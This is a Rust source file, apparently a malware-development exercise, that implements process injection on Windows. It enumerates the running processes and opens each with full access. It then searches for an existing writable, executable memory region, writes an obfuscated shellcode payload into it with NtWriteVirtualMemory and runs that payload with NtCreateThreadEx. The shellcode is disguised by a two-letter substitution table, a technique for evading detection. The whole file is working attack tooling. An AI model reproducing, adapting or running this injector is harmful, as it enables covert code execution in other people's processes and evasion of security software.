use std::ptr;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::shared::ntdef::HANDLE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::VirtualQueryEx;
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::{EnumProcesses, GetModuleBaseNameW};
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, PROCESS_ALL_ACCESS};

// https://github.com/chvancooten/maldev-for-dummies/tree/main/Exercises/Exercise%202%20-%20Basic%20Shellcode%20Injector

const SHELLCODE: &str = "ab ac ad ae af ag ag ag ah ai aj aj aj ak al ak am an al ao ac ap aq ar ac as an at au ac as an av au ac as an aw au ac as ax am au ac ay az ba ba bb ap bc ac ap bd be bf bg bh bi bj aw ak bk bc bl ak bm bk bn bo an ak al au ac as an aw au as bp bf ac bm ai au as bq br aj aj aj ac bs bd bt bu ac bm ai am au as ac av au bv as bw aw bx bm ai by bz ac ag bc au ak as ca br ac bm cb bb ap bc ac ap bd be ak bk bc bl ak bm bk cc cd ce cf au cg ch cg ci cj ck cl cm ce cb cn au bv as bw ci bx bm ai co au ak as cp ac au bv as bw cq bx bm ai au ak as cr br ac bm ai ak cn ak cn cs ct cu ak cn ak ct ak cu ac cv cw aw ak an ag cd cn ak ct cu au ac as cx cy bx ag ag ag cz au ac da da db bm aj aj ak dc cg dd de df ag dg bx dh bk aj aj aj aj au ac da di dj bm aj aj au cg da bs dk bm aj aj ac ap bc ak dc ck cv ao df ag dg ac ap bc ak dc af dl dm ao ag dg ac ar dn dn bu aw do bu ax dn dp aj bb ar dq dq bg dr ar bp bu ds aj ce dq ar ax dt du dv dp dn dn aj";

fn translate(s: &str) -> u8 {
    match s {
        "ab" => 252,
        "ac" => 72,
        "ad" => 129,
        "ae" => 228,
        "af" => 240,
        "ag" => 255,
        "ah" => 232,
        "ai" => 208,
        "aj" => 0,
        "ak" => 65,
        "al" => 81,
        "am" => 80,
        "an" => 82,
        "ao" => 86,
        "ap" => 49,
        "aq" => 210,
        "ar" => 101,
        "as" => 139,
        "at" => 96,
        "au" => 62,
        "av" => 24,
        "aw" => 32,
        "ax" => 114,
        "ay" => 15,
        "az" => 183,
        "ba" => 74,
        "bb" => 77,
        "bc" => 201,
        "bd" => 192,
        "be" => 172,
        "bf" => 60,
        "bg" => 97,
        "bh" => 124,
        "bi" => 2,
        "bj" => 44,
        "bk" => 193,
        "bl" => 13,
        "bm" => 1,
        "bn" => 226,
        "bo" => 237,
        "bp" => 66,
        "bq" => 128,
        "br" => 136,
        "bs" => 133,
        "bt" => 116,
        "bu" => 111,
        "bv" => 68,
        "bw" => 64,
        "bx" => 73,
        "by" => 227,
        "bz" => 92,
        "ca" => 52,
        "cb" => 214,
        "cc" => 56,
        "cd" => 224,
        "ce" => 117,
        "cf" => 241,
        "cg" => 76,
        "ch" => 3,
        "ci" => 36,
        "cj" => 8,
        "ck" => 69,
        "cl" => 57,
        "cm" => 209,
        "cn" => 88,
        "co" => 102,
        "cp" => 12,
        "cq" => 28,
        "cr" => 4,
        "cs" => 94,
        "ct" => 89,
        "cu" => 90,
        "cv" => 131,
        "cw" => 236,
        "cx" => 18,
        "cy" => 233,
        "cz" => 93,
        "da" => 141,
        "db" => 37,
        "dc" => 186,
        "dd" => 119,
        "de" => 38,
        "df" => 7,
        "dg" => 213,
        "dh" => 199,
        "di" => 149,
        "dj" => 14,
        "dk" => 26,
        "dl" => 181,
        "dm" => 162,
        "dn" => 108,
        "do" => 87,
        "dp" => 100,
        "dq" => 115,
        "dr" => 103,
        "ds" => 120,
        "dt" => 51,
        "du" => 50,
        "dv" => 46,
        _ => 0,
    }
}

fn inject_shellcode_into_rwx_region(
    handle: HANDLE,
    base_address: *mut winapi::ctypes::c_void,
) -> Result<(), Box<dyn std::error::Error>> {
    use ntapi::ntmmapi::NtWriteVirtualMemory;
    use ntapi::ntpsapi::NtCreateThreadEx;
    use winapi::shared::ntdef::{HANDLE, NT_SUCCESS, PVOID};

    let shellcode = SHELLCODE.split(' ').map(translate).collect::<Vec<u8>>();

    unsafe {
        let mut bytes_written = 0;
        let status = NtWriteVirtualMemory(
            handle,
            base_address as PVOID,
            shellcode.as_ptr() as PVOID,
            shellcode.len(),
            &mut bytes_written,
        );

        if !NT_SUCCESS(status) {
            // Handle error
            return Err("Failed to write memory".into());
        }

        let mut thread_handle: HANDLE = ptr::null_mut();
        let status = NtCreateThreadEx(
            &mut thread_handle,
            winapi::um::winnt::THREAD_ALL_ACCESS,
            ptr::null_mut(),
            handle,
            base_address as PVOID,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );

        if !NT_SUCCESS(status) {
            // Handle error
            return Err("Failed to create thread".into());
        }

        // Don't forget to close the thread handle when you're done
        // CloseHandle(thread_handle);
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut processes = [0u32; 1024];
        let mut bytes_returned = 0;

        // Enumerate processes
        if EnumProcesses(
            processes.as_mut_ptr(),
            std::mem::size_of_val(&processes) as u32,
            &mut bytes_returned,
        ) == 0
        {
            return Err("Failed to enumerate processes".into());
        }

        let num_processes = bytes_returned / std::mem::size_of::<DWORD>() as u32;

        for &process_id in &processes[..num_processes as usize] {
            if process_id == 0 {
                continue;
            } // System Idle Process, skip it

            let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

            if h_process.is_null() {
                println!("[-] Couldn't open process {}", process_id);
                continue;
            }

            let mut process_name = [0u16; 260]; // MAX_PATH
            let name_len = GetModuleBaseNameW(
                h_process,
                ptr::null_mut(),
                process_name.as_mut_ptr(),
                process_name.len() as u32,
            );
            let process_name = String::from_utf16_lossy(&process_name[..name_len as usize]);

            println!("[+] Opened process {} (ID: {})", process_name, process_id);

            let mut address: *mut winapi::ctypes::c_void = ptr::null_mut();
            let mut success = false;

            loop {
                let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();

                let result = VirtualQueryEx(
                    h_process,
                    address,
                    &mut mbi,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );

                if result == 0 {
                    break; // No more memory regions to query
                }

                if mbi.Protect == winapi::um::winnt::PAGE_EXECUTE_READWRITE {
                    println!(
                        "[+] Found PAGE_EXECUTE_READWRITE memory region at {:p}",
                        mbi.BaseAddress
                    );

                    if mbi.RegionSize >= 317 {
                        inject_shellcode_into_rwx_region(h_process, mbi.BaseAddress)?;
                        success = true;
                        break;
                    } else {
                        println!(
                            "[-] Memory region too small ({} bytes), skipping",
                            mbi.RegionSize
                        );
                    }
                }

                address = (mbi.BaseAddress as usize + mbi.RegionSize) as *mut _;
            }

            CloseHandle(h_process);

            if success {
                break;
            }
        }
    }

    Ok(())
}
